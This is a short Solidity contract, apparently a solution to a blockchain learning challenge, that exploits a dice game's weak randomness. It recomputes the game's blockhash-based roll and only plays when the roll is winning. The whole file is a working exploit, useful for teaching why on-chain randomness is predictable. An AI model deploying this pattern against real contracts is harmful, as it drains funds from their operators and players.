pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance);
        payable(_addr).transfer(_amount);
    }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Don't forget put money to the Rigger Contract");
        uint256 _roll = getNextRoll();
        require(_roll <= 2, "Skipping this round ;)");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    function getNextRoll() internal view returns (uint256) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));

        return uint256(hash) % 16;
    }

}
